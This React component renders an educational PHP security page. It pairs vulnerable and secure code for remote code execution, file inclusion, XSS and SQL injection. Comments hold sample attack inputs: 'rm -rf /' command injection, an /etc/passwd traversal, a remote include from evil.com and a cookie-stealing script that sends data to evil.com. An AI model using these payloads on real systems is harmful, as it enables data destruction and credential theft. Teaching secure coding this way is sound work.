import React from 'react';
import NavBar from '@/components/NavBar';
import Footer from '@/components/Footer';
import CodeExample from '@/components/CodeExample';
import { Link } from 'react-router-dom';
import { Shield, FileWarning, Terminal, AlertTriangle } from 'lucide-react';

const PHP = () => {
  return (
    <div className="min-h-screen flex flex-col">
      <NavBar />
      
      <main className="flex-grow py-12">
        <div className="container mx-auto px-4">
          <div className="mb-12">
            <h1 className="text-4xl font-bold mb-6">PHP Security</h1>
            <div className="h-1 w-24 bg-cybr-primary mb-6"></div>
            <p className="text-xl text-cybr-foreground/80">
              Security vulnerabilities and best practices for PHP applications.
            </p>
          </div>
          
          <div className="card mb-8">
            <h2 className="text-2xl font-bold mb-4">About PHP</h2>
            <p className="mb-4">
              PHP (Hypertext Preprocessor) is a widely-used open source general-purpose scripting language that is especially
              suited for web development and can be embedded into HTML. Created by Rasmus Lerdorf in 1994, PHP was originally
              designed to create dynamic web pages but has evolved into a full-featured programming language.
            </p>
            <p className="mb-4">
              As a server-side scripting language, PHP code is executed on the server, generating HTML that is then sent to
              the client. PHP is remarkably flexible and powers everything from personal blogs to some of the world's largest
              websites like WordPress, Facebook (historical codebase), and Wikipedia. Its popularity stems from its ease of
              use, wide hosting support, and large ecosystem of frameworks like Laravel, Symfony, and CodeIgniter.
            </p>
            <p className="mb-4">
              PHP's syntax draws elements from C, Java, and Perl, with a few unique PHP-specific features. While originally
              a procedural language, PHP now supports object-oriented programming as well. Over time, PHP has evolved significantly,
              with modern versions (PHP 7 and 8) offering improved performance, better type safety, and new language features.
            </p>
            <p>
              However, PHP's historical legacy and flexibility have also led to security challenges. Its ease of use and
              loose typing system can make it easy for developers to inadvertently introduce vulnerabilities such as SQL injection,
              cross-site scripting (XSS), CSRF, and remote code execution if proper security practices aren't followed.
              Understanding these risks is particularly important given PHP's widespread use in web applications.
            </p>
          </div>
          
          {/* New introduction paragraphs */}
          <div className="mb-10 prose prose-cybr max-w-none">
            <p className="text-lg">
              PHP powers a significant percentage of the web, including major platforms like WordPress, which makes it a frequent target for attackers. As a server-side scripting language with relatively permissive defaults, PHP applications historically have been susceptible to various security vulnerabilities. Over the years, the PHP language and its ecosystem have evolved significantly, introducing better security features and frameworks, but the legacy of its early design decisions continues to influence security practices.
            </p>
            <p className="text-lg mt-4">
              Security considerations in PHP often center around proper input validation, output encoding, and configuration management. The language's flexibility, while beneficial for rapid development, can lead to security pitfalls when developers don't follow secure coding practices. Modern PHP frameworks like Laravel, Symfony, and CodeIgniter have built-in security features that help mitigate common vulnerabilities, but understanding the underlying security principles remains crucial for PHP developers to create robust, secure applications.
            </p>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2 space-y-8">
              <section>
                <h2 className="text-2xl font-bold mb-4">Remote Code Execution (RCE)</h2>
                <p className="mb-4">
                  PHP has several functions that can execute code or commands, creating potential for remote code execution.
                </p>
                
                <CodeExample
                  language="php"
                  title="Remote Code Execution Vulnerability"
                  code={`<?php
// VULNERABLE: Using eval with user input
function dynamicCalculator($expression) {
    // User input directly evaluated as PHP code
    return eval('return ' . $expression . ';');
}

// Example usage in a web application:
if (isset($_GET['calc'])) {
    echo "Result: " . dynamicCalculator($_GET['calc']);
}

// Attacker could input: 1; system('rm -rf /') 
// Which would delete files if permissions allow
?>

<?php
// VULNERABLE: Using shell_exec with user input
function pingHost($host) {
    // User input directly passed to shell command
    return shell_exec('ping -c 4 ' . $host);
}

// Example usage:
if (isset($_POST['host'])) {
    echo "<pre>" . pingHost($_POST['host']) . "</pre>";
}

// Attacker could input: google.com; rm -rf /
?>
`}
                />
                
                <CodeExample
                  language="php"
                  title="Secure Alternatives"
                  code={`<?php
// SECURE: Use a proper expression parser instead of eval
// For mathematical expressions, consider using libraries like:
// - symfony/expression-language
// - mossadal/math-parser

// Example with custom validation:
function safeCalculator($expression) {
    // Validate input allows only safe mathematical operations
    if (!preg_match('/^[0-9+\\-*\\/(). ]+$/', $expression)) {
        return "Invalid expression";
    }
    
    // Use a proper math evaluation library
    // Or for simple cases:
    try {
        // Still risky but much safer with strict validation
        return eval('return ' . $expression . ';');
    } catch (ParseError $e) {
        return "Error: " . $e->getMessage();
    }
}

// SECURE: For system commands, use escapeshellarg
function pingHostSafely($host) {
    // Validate input first
    if (!filter_var($host, FILTER_VALIDATE_DOMAIN)) {
        return "Invalid hostname";
    }
    
    // Escape arguments properly
    $escapedHost = escapeshellarg($host);
    return shell_exec("ping -c 4 $escapedHost");
}
?>
`}
                />
              </section>
              
              <section>
                <h2 className="text-2xl font-bold mb-4">File Inclusion Vulnerabilities</h2>
                <p className="mb-4">
                  PHP's include and require functions can lead to Local File Inclusion (LFI) or Remote File Inclusion (RFI) if used with untrusted input.
                </p>
                
                <CodeExample
                  language="php"
                  title="File Inclusion Vulnerability"
                  code={`<?php
// VULNERABLE: Direct use of user input in file inclusion
$page = $_GET['page'];

// Local File Inclusion vulnerability
include($page . '.php');

// Attacker could use: ?page=../../../etc/passwd%00
// With older PHP versions supporting null byte termination

// VULNERABLE: Remote File Inclusion
if (isset($_GET['module'])) {
    // Remote File Inclusion vulnerability
    include($_GET['module']);
}

// Attacker could use: ?module=http://evil.com/malicious-script.php
?>
`}
                />
                
                <CodeExample
                  language="php"
                  title="Secure File Inclusion"
                  code={`<?php
// SECURE: Whitelist allowed pages
function loadPage($page) {
    // Define allowed pages
    $allowedPages = [
        'home' => 'home.php',
        'about' => 'about.php',
        'contact' => 'contact.php'
    ];
    
    // Check if requested page is in the allowed list
    if (isset($allowedPages[$page])) {
        include $allowedPages[$page];
    } else {
        include 'home.php'; // Default page
    }
}

// Usage:
if (isset($_GET['page'])) {
    loadPage($_GET['page']);
} else {
    loadPage('home');
}

// ALTERNATIVE: Use a router instead of direct file inclusion
// Example with a simple router
$routes = [
    'home' => function() { require 'pages/home.php'; },
    'about' => function() { require 'pages/about.php'; },
    'contact' => function() { require 'pages/contact.php'; }
];

$page = $_GET['page'] ?? 'home';
$routeHandler = $routes[$page] ?? $routes['home'];
$routeHandler();
?>
`}
                />
              </section>
              
              <section>
                <h2 className="text-2xl font-bold mb-4">Cross-Site Scripting (XSS)</h2>
                <p className="mb-4">
                  XSS is particularly common in PHP applications when output isn't properly escaped or sanitized.
                </p>
                
                <CodeExample
                  language="php"
                  title="XSS Vulnerability"
                  code={`<?php
// VULNERABLE: Directly echoing user input
function displaySearch() {
    $query = $_GET['q'] ?? '';
    
    echo "<h2>Search results for: " . $query . "</h2>";
    // Search logic...
}

// Attacker could input: <script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>

// VULNERABLE: Using user input in HTML attributes
function displayUserProfile() {
    $userId = $_GET['id'] ?? '1';
    
    echo "<div class='profile' data-user='" . $userId . "'>";
    // Profile content...
    echo "</div>";
}

// Attacker could input: 1' onmouseover='alert(document.cookie)
?>
`}
                />
                
                <CodeExample
                  language="php"
                  title="Preventing XSS"
                  code={`<?php
// SECURE: Using htmlspecialchars for output escaping
function displaySearchSafely() {
    $query = $_GET['q'] ?? '';
    $safeQuery = htmlspecialchars($query, ENT_QUOTES, 'UTF-8');
    
    echo "<h2>Search results for: " . $safeQuery . "</h2>";
    // Search logic...
}

// SECURE: Proper context-specific escaping
function displayUserProfileSafely() {
    $userId = $_GET['id'] ?? '1';
    
    // Validate that it's actually an integer
    if (!ctype_digit($userId)) {
        $userId = '1'; // Default valid ID
    }
    
    echo "<div class='profile' data-user='" . htmlspecialchars($userId, ENT_QUOTES, 'UTF-8') . "'>";
    // Profile content...
    echo "</div>";
}

// ALTERNATIVE: Using templating engines with auto-escaping
// Example with Twig:
$loader = new \\Twig\\Loader\\FilesystemLoader('templates');
$twig = new \\Twig\\Environment($loader, [
    'autoescape' => 'html', // Auto-escaping enabled
]);

echo $twig->render('search.twig', ['query' => $_GET['q'] ?? '']);
?>
`}
                />
              </section>
              
              <section>
                <h2 className="text-2xl font-bold mb-4">SQL Injection</h2>
                <p className="mb-4">
                  SQL injection vulnerabilities are common in PHP applications that build queries through string concatenation.
                </p>
                
                <CodeExample
                  language="php"
                  title="SQL Injection Vulnerability"
                  code={`<?php
// VULNERABLE: Direct string concatenation in SQL
function getUserByUsername($username) {
    global $db;
    
    // VULNERABLE: String concatenation
    $query = "SELECT * FROM users WHERE username = '" . $username . "'";
    $result = $db->query($query);
    
    return $result->fetch_assoc();
}

// Example usage
$user = getUserByUsername($_POST['username']);

// Attacker could input: admin' OR '1'='1
// Query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
?>
`}
                />
                
                <CodeExample
                  language="php"
                  title="Secure SQL Queries"
                  code={`<?php
// SECURE: Using prepared statements with MySQLi
function getUserByUsernameSafely($username) {
    global $db;
    
    // SECURE: Using prepared statement
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    
    return $stmt->get_result()->fetch_assoc();
}

// ALTERNATIVE: Using PDO
function getUserWithPDO($username) {
    global $pdo;
    
    // SECURE: Using PDO prepared statement
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->bindParam(':username', $username);
    $stmt->execute();
    
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

// Usage:
try {
    $user = getUserWithPDO($_POST['username']);
    
    if ($user) {
        // User found
    } else {
        // User not found
    }
} catch (PDOException $e) {
    // Handle error (don't display to user in production)
}
?>
`}
                />
              </section>
            </div>
            
            <div className="lg:col-span-1">
              <div className="sticky top-24">
                <div className="card">
                  <h3 className="text-xl font-bold mb-4">PHP Security Vulnerabilities</h3>
                  <ul className="space-y-2 pl-4 text-cybr-foreground/80">
                    <li>Remote Code Execution</li>
                    <li>File Inclusion (LFI/RFI)</li>
                    <li>Cross-Site Scripting (XSS)</li>
                    <li>SQL Injection</li>
                    <li>CSRF Vulnerabilities</li>
                    <li>Session Security Issues</li>
                    <li>Insecure File Uploads</li>
                    <li>Directory Traversal</li>
                  </ul>
                </div>
                
                <div className="card mt-6">
                  <h3 className="text-xl font-bold mb-4">PHP Security Tools</h3>
                  <ul className="space-y-3 text-cybr-foreground/80">
                    <li><a href="https://github.com/vimeo/psalm" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">Psalm</a></li>
                    <li><a href="https://github.com/squizlabs/PHP_CodeSniffer" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">PHP_CodeSniffer</a></li>
                    <li><a href="https://github.com/phpstan/phpstan" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">PHPStan</a></li>
                    <li><a href="https://github.com/SonarSource/sonar-php" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">SonarQube for PHP</a></li>
                  </ul>
                </div>
                
                <div className="card mt-6">
                  <h3 className="text-xl font-bold mb-4">PHP Security Resources</h3>
                  <ul className="space-y-3 text-cybr-foreground/80">
                    <li><a href="https://www.php.net/manual/en/security.php" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">PHP Security Manual</a></li>
                    <li><a href="https://owasp.org/www-project-cheat-sheets/" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">OWASP Cheat Sheets</a></li>
                    <li><a href="https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software" target="_blank" rel="noreferrer" className="text-cybr-primary hover:underline">Paragonie's Guide to Secure PHP</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default PHP;
